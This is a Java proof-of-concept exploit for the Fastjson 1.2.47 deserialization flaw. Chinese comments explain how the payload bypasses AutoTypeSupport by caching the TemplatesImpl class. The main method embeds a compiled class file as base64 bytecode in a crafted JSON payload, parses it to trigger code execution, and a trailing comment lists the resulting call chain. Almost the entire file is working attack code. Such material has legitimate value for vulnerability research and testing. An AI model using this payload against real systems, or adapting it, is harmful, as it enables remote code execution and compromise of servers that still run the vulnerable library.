package org.example.no1;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.io.IOUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

/**
 * Fastjson 1.2.47 版本的反序列化漏洞

 可以在不开启 AutoTypeSupport 利用

 在判断 autoTypeSupport 之前，通过  ParserConfig.java 953 行 clazz = deserializers.findClass(typeName);
 将Class加载，加载进去之后下次通过  949 行clazz = TypeUtils.getClassFromMapping(typeName);就可以加载TemplatesImpl类了。
 *
 **/
public class PoC3_1_2_47 {
    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }
    public static void main(String args[]){
        String classFilePath = "CalcTest.class";
        String evilCode = readClass(classFilePath);
        try {
            String text1 = "{\n" +
                    "    \"no1\": {\n" +
                    "        \"@type\": \"java.lang.Class\",\n" +
                    "        \"val\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"\n" +
                    "    },\n" +
                    "    \"no2\": {\n" +
                    "        \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
                    "        \"_bytecodes\": [\"" + evilCode + "\"],\n" +
                    "        \"_name\": \"123\",\n" +
                    "        \"_tfactory\": {},\n" +
                    "        \"_outputProperties\": {},\n" +
                    "        \"_version\": \"1.0\",\n" +
                    "        \"allowedProtocols\": \"all\"\n" +
                    "    }\n" +
                    "}";

            System.out.println(text1);
            Object obj = JSON.parseObject(text1, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    /**
     * 调用链
     * at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:458)
     * 	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:485)
     * 	at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:506)
     * 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
     * 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
     * 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
     * 	at java.lang.reflect.Method.invoke(Method.java:498)
     * 	at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:85)
     * 	at com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer.parseField(DefaultFieldDeserializer.java:83)
     * 	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField(JavaBeanDeserializer.java:773)
     * 	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:600)
     * 	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:188)
     * 	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:184)
     * 	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:368)
     * 	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)
     * 	at com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.deserialze(JavaObjectDeserializer.java:45)
     * 	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:639)
     * 	at com.alibaba.fastjson.JSON.parseObject(JSON.java:339)
     * 	at com.alibaba.fastjson.JSON.parseObject(JSON.java:243)
     * 	at org.example.no1.PoC1.main(PoC1.java:34)
     */
}